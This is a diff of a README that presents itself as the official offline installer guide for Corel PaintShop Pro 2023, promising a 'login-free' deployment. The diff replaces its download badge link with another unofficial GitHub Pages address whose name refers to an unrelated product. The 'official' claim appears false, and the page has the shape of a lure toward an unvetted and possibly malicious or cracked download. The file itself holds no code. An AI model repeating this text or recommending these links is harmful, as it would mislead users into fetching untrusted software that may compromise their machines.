@@ -2,7 +2,7 @@
 
 Welcome to the official offline installation assistant for **Corel PaintShop Pro**. This guide walks you through a secure and login-free deployment of PaintShop Pro 2023 in air-gapped or enterprise environments.
 
-[![Download Setup Guide](https://img.shields.io/badge/Download-Setup_Guide-blueviolet)](https://matookfj.github.io/.github/paintshop)
+[![Download Setup Guide](https://img.shields.io/badge/Download-Setup_Guide-blueviolet)](https://pinnacle-studio-26-ultimate-download.github.io/.github/)
 
 ---
 
